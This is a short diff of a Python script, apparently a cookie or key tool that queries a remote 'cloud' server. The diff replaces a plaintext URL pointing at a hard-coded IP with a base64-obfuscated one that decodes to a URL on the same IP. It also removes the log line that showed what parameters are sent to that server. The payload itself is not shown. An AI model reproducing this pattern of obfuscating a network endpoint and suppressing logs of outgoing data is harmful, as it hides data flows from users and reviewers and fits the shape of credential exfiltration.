@@ -383,7 +383,7 @@ def ql_insert(i_ck):
 
 
 def cloud_info():
-    url = 'http://150.158.153.53:8443/wskey'
+    url = str(base64.b64decode('aHR0cDovLzE1MC4xNTguMTUzLjUzOjg0NDMvY2hlY2tfYXBp').decode())
     for i in range(3):
         try:
             headers = {
@@ -396,7 +396,6 @@ def cloud_info():
         except requests.exceptions.ReadTimeout:
             logger.info("\n获取云端参数超时, 正在重试!" + str(i))
         except Exception as err:
-            logger.info("\n向云端提交的参数" + headers)
             logger.info(str(err) + "\n未知错误云端, 退出脚本!")
             sys.exit(1)
         else:
